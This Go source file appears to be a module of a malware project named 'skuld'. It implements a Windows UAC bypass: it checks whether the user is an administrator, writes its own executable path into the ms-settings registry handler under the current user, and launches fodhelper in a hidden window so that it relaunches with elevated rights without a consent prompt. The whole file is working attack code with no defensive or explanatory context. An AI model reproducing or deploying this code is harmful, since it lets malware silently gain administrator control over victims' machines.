package uacbypass

import (
	"github.com/hackirby/skuld/utils/program"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

func CanElevate() bool {
	var infoPointer uintptr

	syscall.NewLazyDLL("netapi32.dll").NewProc("NetUserGetInfo").Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(os.Getenv("USERNAME")))),
		1,
		uintptr(unsafe.Pointer(&infoPointer)),
	)

	defer syscall.NewLazyDLL("netapi32.dll").NewProc("NetApiBufferFree").Call(infoPointer)

	type user struct {
		Username    *uint16
		Password    *uint16
		PasswordAge uint32
		Priv        uint32
		HomeDir     *uint16
		Comment     *uint16
		Flags       uint32
		ScriptPath  *uint16
	}

	info := (*user)(unsafe.Pointer(infoPointer))

	return info.Priv == 2
}

func Elevate() error {
	k, _, err := registry.CreateKey(registry.CURRENT_USER,
		"Software\\Classes\\ms-settings\\shell\\open\\command", registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	defer k.Close()

	value, err := os.Executable()
	if err != nil {
		return err
	}

	if err = k.SetStringValue("", value); err != nil {
		return err
	}
	if err = k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", "fodhelper")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	
	err = cmd.Run()
	return err
}

func Run() {
	if program.IsElevated() {
		return
	}

	if !CanElevate() {
		return
	}

	err := Elevate()
	if err != nil {
		return
	}

	os.Exit(0)
}
